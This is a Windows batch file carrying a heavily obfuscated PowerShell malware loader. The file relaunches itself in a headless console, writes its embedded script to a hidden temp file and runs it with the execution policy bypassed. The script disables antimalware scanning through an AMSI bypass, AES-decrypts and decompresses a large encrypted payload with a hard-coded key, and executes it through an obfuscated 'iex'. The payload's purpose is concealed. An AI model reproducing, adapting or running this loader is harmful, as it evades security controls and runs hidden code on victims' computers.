@echo off
if not "%~1"=="__H" (
    conhost.exe --headless cmd.exe /c "%~f0" __H
    exit /b
)

setlocal EnableExtensions
set "PS=%TEMP%\%RANDOM%%RANDOM%.ps1"
del "%PS%" 2>nul

powershell -NoP -W Hidden -ExecutionPolicy Bypass -Command "$L=[IO.File]::ReadAllLines('%~f0');$A=[array]::IndexOf($L,'#PS1#')+1;$B=[array]::IndexOf($L,'#END#');[IO.File]::WriteAllLines($env:PS,$L[$A..($B-1)])"
if not exist "%PS%" exit /b

powershell -NoP -W Hidden -ExecutionPolicy Bypass -File "%PS%"
del "%PS%" 2>nul
endlocal
exit /b

#PS1#
$YcCtlvzCNLetZQ = ('Asse' + 'mbly')
$qn6yeSvVQGYF3Fb = ('GetTy' + 'pe')
$jDH8agl4BJrw6y = ('GetFi' + 'eld')
$IATBlQGQxKXSV7u7It = ('SetV' + 'alue')
$NDuvzIeK9XwXtT0veT = [StRIng]::('new')([CONVERt]::('FromBa' + 'se64' + 'String')('U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdA=='))
$IdQhuCHDsCce77qWE = [StRIng]::('new')([CONVERt]::('FromBa' + 'se64' + 'String')('aW9uLkFtc2lVdGlscw=='))
$UPLqVOkrphI40qK7y = [StRIng]::('new')([CONVERt]::('FromBa' + 'se64' + 'String')('YW1zaUluaXRGYWlsZWQ='))
$RCRLJDUy1WE14d = [StRIng]::('new')([CONVERt]::('FromBa' + 'se64' + 'String')('Tm9uUHVibGljLFN0YXRpYw=='))
$WfytKSAqhAUM0X0ZIk = [reF].$YcCtlvzCNLetZQ
$QGyBcqORtsFvhD = $WfytKSAqhAUM0X0ZIk.$qn6yeSvVQGYF3Fb.('INVOKe')(($NDuvzIeK9XwXtT0veT+$IdQhuCHDsCce77qWE))
$JubzPumcCsPmFMbe = $QGyBcqORtsFvhD.$jDH8agl4BJrw6y.('INVOKe')($UPLqVOkrphI40qK7y,$RCRLJDUy1WE14d)
$JubzPumcCsPmFMbe.$IATBlQGQxKXSV7u7It.('INVOKe')((100-100),(200 -eq 200))
$Tcfg6hkruo1fkmOAYi = ('Mode')
$ttWJWuBE1RXcrIRb3 = ('Bloc' + 'kSize')
$hfMU4fgDg6sTH9C = ('KeyS' + 'ize')
$TOv8rtEoOxjcXYEV = ('Key')
$rJUC35YTsFKIYj7cUZ = ('Iv')
$AxUU5xcrNZG44E1 = ('Crea' + 'teDe' + 'crypt' + 'or')
$iEdJf4kuFF2YsBOxu = ('Transf' + 'ormF' + 'inal' + 'Block')
$zXyWhv4BScB22hy0O = ('Leng' + 'th')
$TaKE0hBg4w5zuS5x = ('CopyTo')
$Dj7yBTA155tGG5mpG = ('Clos' + [Char](101))
$FxeNesQu0dYEJlZz5 = ('Dispos' + [ChAr](101))
$DvpJyOxXRtACtLQQlV = ('ToAr' + 'ray')
$Cjte1M2O3XJprX58 = ('GetS' + 'tring')
$hKo9pXubFqXZLpSFx = [cONVErT]::('FromBa' + 'se64' + 'String')('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')
$uFrVVA2MOWawYf8GG = [cONVErT]::('FromBa' + 'se64' + 'String')('NhZhUzt0HCT8d/2kmbXYo4th2MXtWeio63Xj7qKGpkQ=')
$w7Rmc28rnZ6KD3iLX = [sEcUrITY.CRYPtOGraphY.AeS]::('Create')()
$w7Rmc28rnZ6KD3iLX.$Tcfg6hkruo1fkmOAYi = [SeCuRITy.CryPTOgRApHY.CIPHermoDE]::('Cbc')
$w7Rmc28rnZ6KD3iLX.$ttWJWuBE1RXcrIRb3 = [INt]((5373 -band 801)+(5373 -bor 801)-6046)
$w7Rmc28rnZ6KD3iLX.$hfMU4fgDg6sTH9C = [int]((7645 -band 5371)+(7645 -bor 5371)-12760)
$w7Rmc28rnZ6KD3iLX.$TOv8rtEoOxjcXYEV = $uFrVVA2MOWawYf8GG
$w7Rmc28rnZ6KD3iLX.$rJUC35YTsFKIYj7cUZ = $hKo9pXubFqXZLpSFx[0..15]
$eMvcTecINXydv3kYQ = $w7Rmc28rnZ6KD3iLX.$AxUU5xcrNZG44E1.('INvokE')()
$lxc91DvHqRtgFH = $eMvcTecINXydv3kYQ.$iEdJf4kuFF2YsBOxu.('INvokE')($hKo9pXubFqXZLpSFx,16,($hKo9pXubFqXZLpSFx.$zXyWhv4BScB22hy0O - 16))
$uenHXDXkYNIy2e = [iO.mEMORystreaM]::('new')([BytE[]]$lxc91DvHqRtgFH)
$TtqLBeVgjZLLNBpGD = [iO.mEMORystreaM]::('new')()
$zDtTyQ6HG3EhnBbQX = [iO.ComPreSSion.gZIPsTream]::('new')($uenHXDXkYNIy2e, [Io.CoMPReSSiON.COmpREssIonMODe]::('Decom' + 'pres' + [ChAR](115)))
$zDtTyQ6HG3EhnBbQX.$TaKE0hBg4w5zuS5x.('INvokE')($TtqLBeVgjZLLNBpGD)
$zDtTyQ6HG3EhnBbQX.$Dj7yBTA155tGG5mpG.('INvokE')()
$w7Rmc28rnZ6KD3iLX.$FxeNesQu0dYEJlZz5.('INvokE')()
$uenHXDXkYNIy2e.$Dj7yBTA155tGG5mpG.('INvokE')()
$k73Yfv9go7wF8U = $TtqLBeVgjZLLNBpGD.$DvpJyOxXRtACtLQQlV.('INvokE')()
$QJLaq5dKBgcULkQ = [TexT.eNCODinG]::('Utf8')
$tV9AEiv8vOe5nn65O = $QJLaq5dKBgcULkQ.$Cjte1M2O3XJprX58.('INvokE')($k73Yfv9go7wF8U)
.([char]((3050-band5530)+(3050-bor5530)-8475)+[char]((7585-band5302)+(7585-bor5302)-12786)+[char]((8061-band7397)+(8061-bor7397)-15338))($tV9AEiv8vOe5nn65O)
#END#